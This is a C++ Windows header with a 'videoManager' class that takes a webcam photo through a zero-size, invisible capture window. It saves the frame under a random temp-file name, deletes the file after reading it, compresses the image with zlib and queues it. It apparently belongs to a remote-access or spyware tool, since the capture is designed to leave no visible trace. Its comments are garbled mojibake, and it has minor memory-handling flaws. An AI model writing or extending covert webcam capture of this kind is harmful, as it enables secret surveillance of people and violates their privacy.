#pragma once
#include "pch.h"
#include <string> 
#include<WINDOWSX.H>
#include<windows.h>

#include "mStruct.cpp"
#include "ThreadSafeQueue.cpp"
//��Ƶ
#include <vfw.h>
#pragma comment( lib, "vfw32.lib" ) 

#include "zlib/zlib.h"
#pragma comment(lib, "./zlib/zlibstat.lib")
using namespace std;

class videoManager {

public:
	static ThreadSafeQueue<mvideo> videoQueue;
	//����
	void takePhoto()
	{

		HWND videohwnd = capCreateCaptureWindow(NULL, WS_POPUP, 0, 0, 0, 0, 0, 0);

		 //window name if pop-up // window style // window position and dimensions//hwndParent child ID
		BOOL bRet = FALSE;
		char lpszName[1000], lpszVer[500];
		int i;
		for (i = 0; i < 10 && !bRet; i++)
		{
			bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName), lpszVer, sizeof(lpszVer));
		}//��ȡ����ͷ�����
		int cameraIndex = i - 1;
		if (FALSE == capDriverConnect(videohwnd, cameraIndex)) {//��������ͷ
			//cout << "connect error"<< i << endl;
			return ;
		}

		capPreview(videohwnd, TRUE);//Ԥ��
		string fileName = randBmpName();
		capFileSaveDIB(videohwnd, TEXT(fileName.c_str()));//����ͼƬ ��֪����ô���浽�ڴ�
		//printf("%s\n", fileName.c_str());s
		capDriverDisconnect(videohwnd);
		//CloseHandle(videohwnd);
		::SendMessage(videohwnd, WM_CLOSE, 0, 0);
		FILE *pFile;
		pFile = fopen(fileName.c_str(), "rb");
		if (pFile == NULL) {
			return ;
		}
		fseek(pFile, 0, SEEK_END);
		unsigned long bmpSize = ftell(pFile);
		unsigned long bmpZipSize = bmpSize;
		rewind(pFile);

		/* �����ڴ�洢�����ļ� */
		byte *bmpMem = new byte[bmpSize];
		fread(bmpMem, 1, bmpSize, pFile);
		fclose(pFile);
		remove(fileName.c_str());//ɾ���ļ�

		byte *bmpZipMem = new byte[bmpSize];
		compress(bmpZipMem, &bmpZipSize, bmpMem, bmpSize);
		delete bmpMem;
		bmpMem = nullptr;
		mvideo tmp;
		tmp.bmpSize = bmpSize;
		tmp.bmpZipSize = bmpZipSize;
		tmp.bmpZipMem = bmpZipMem;
		videoQueue.push(tmp);

	}

	string randBmpName() {
		char TempFilePath[MAX_PATH];
		GetTempPath(sizeof(TempFilePath), TempFilePath);
		char tmp[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

		char BmpName[20];
		int k;
		for (int i = 0; i < 15; i++)
		{
			k = rand();
			BmpName[i] = tmp[k % (sizeof(tmp) - 1)];
		}
		BmpName[15] = '.';
		BmpName[16] = 'b';
		BmpName[17] = 'm';
		BmpName[18] = 'p';
		BmpName[19] = 0x00;
		return strcat(TempFilePath, BmpName);

	}

};